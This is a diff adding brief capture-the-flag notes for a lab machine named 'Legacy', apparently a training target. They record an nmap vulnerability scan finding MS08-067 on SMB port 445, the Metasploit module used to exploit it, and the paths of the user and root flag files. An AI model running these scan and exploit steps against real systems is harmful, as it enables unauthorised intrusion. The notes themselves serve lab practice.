@@ -1,0 +1,10 @@
+Legacy
+================
+- nmap: 445 offen
+- nmap -p445 --script=vuln 10.10.10.4
+  => Microsoft Windows system vulnerable to remote code execution (MS08-067)
+  |     State: LIKELY VULNERABLE
+  |     IDs:  CVE:CVE-2008-4250
+- MSF use exploit/windows/smb/ms08_067_netapi
+  => C:\Documents and Settings\john\Desktop\user.txt
+  => C:\Documents and Settings\Administrator\Desktop\root.txt
